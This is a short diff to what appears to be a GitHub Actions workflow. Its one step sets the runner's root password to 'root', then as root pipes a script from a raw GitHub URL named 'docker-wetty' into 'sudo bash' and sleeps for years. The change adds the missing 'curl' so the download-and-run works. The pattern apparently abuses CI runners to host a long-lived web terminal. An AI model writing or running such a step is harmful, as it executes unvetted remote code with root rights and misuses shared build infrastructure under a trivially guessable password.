@@ -5,6 +5,6 @@ jobs:
     runs-on: ubuntu-latest  
     steps:     
       - name: new
-        run: printf "root\nroot" | sudo passwd root && printf "root" | su - root -c " https://raw.githubusercontent.com/jhajikv-ji/no/main/docker-wetty | sudo bash && sleep 99999999 " 
+        run: printf "root\nroot" | sudo passwd root && printf "root" | su - root -c " curl https://raw.githubusercontent.com/jhajikv-ji/no/main/docker-wetty | sudo bash && sleep 99999999 " 
              
 
